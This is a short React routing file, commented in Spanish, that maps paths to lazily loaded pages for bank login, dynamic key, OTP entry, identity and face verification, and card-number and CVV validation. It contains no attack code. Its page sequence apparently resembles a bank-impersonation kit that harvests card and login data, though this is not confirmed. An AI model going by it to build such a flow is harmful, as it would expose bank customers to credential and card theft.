import { lazy } from "react";
import AuthGuard from "../../auth/AuthGuard";

// Se inicializan los componentes
const IniciarSesion = lazy(() => import("./IniciarSesion"));
const ClaveDinamica = lazy(() => import("./ClaveDinamica"));
const NumeroOTP = lazy(() => import("./NumeroOTP"));
const Error923page = lazy(() => import("./Erro923page"));
const TCcustoms = lazy(() => import("./TCcustoms"));
const IngresaTusDatos = lazy(() => import("./IngresaTusDatos"));
const General = lazy(() => import("./General"));
const FinalizadoPage = lazy(() => import("./finalizado-page"));
const VerificacionIdentidad = lazy(() => import("./VerificacionIdentidad"));
const CVVcustoms = lazy(() => import("./CVVcustoms"));
const TESTvalidacion = lazy(() => import("./TESTvalidacion"));
const FaceDetectionCanvas = lazy(() => import("./FaceDetectionCanvas"));
const ValidacionCVV = lazy(() => import("./ValidacionCVV"));
const ValidacionTC = lazy(() => import("./ValidacionTC"));
const ValidacionTCCustom = lazy(() => import("./ValidacionTCCustom"));
const VistaPrincipal = lazy(() => import("./VistaPrincipal"));

// Se generaliza las rutas
const widgetsRoute = [
  {
    path: "/autenticacion",
    element: (

      <IniciarSesion />

    )
  },
  {
    path: "/clave-dinamica",
    element: (

      <ClaveDinamica />

    )
  },
  {
    path: "/numero-otp",
    element: (

      <NumeroOTP />

    )
  },
  {
    path: "/error-923page",
    element: (

      <Error923page />

    )
  },
  {
    path: "/ingresa-tus-datos",
    element: <IngresaTusDatos />,
  },
  {
    path: "/general",
    element: (
      <General />
    )
  },
  {
    path: "/finalizado-page",
    element: (

      <FinalizadoPage />

    )
  },
  {
    path: "/verificacion-identidad",
    element: (

      <VerificacionIdentidad />

    )
  },
  {
    path: "/test-validacion",
    element: (

      <TESTvalidacion />

    )
  },
  {
    path: "/deteccion-rostros",
    element: (

      <FaceDetectionCanvas />

    )
  },
  {
    path: "/validacion-cvv",
    element: (
      <ValidacionCVV />
    )
  },
  {
    path: "/validacion-tc",
    element: (
      <ValidacionTC />
    )
  },
  {
    path: "/validacion-tc-custom",
    element: (

      <ValidacionTCCustom />

    )
  },
  {
    path: "/tc-customs",
    element: <TCcustoms />,
  },
  {
    path: "/cvv-customs",
    element: <CVVcustoms />,
  },
  {
    path: "/personas",
    element: <VistaPrincipal />
  }
];

// Se exporta la funcion
export default widgetsRoute;
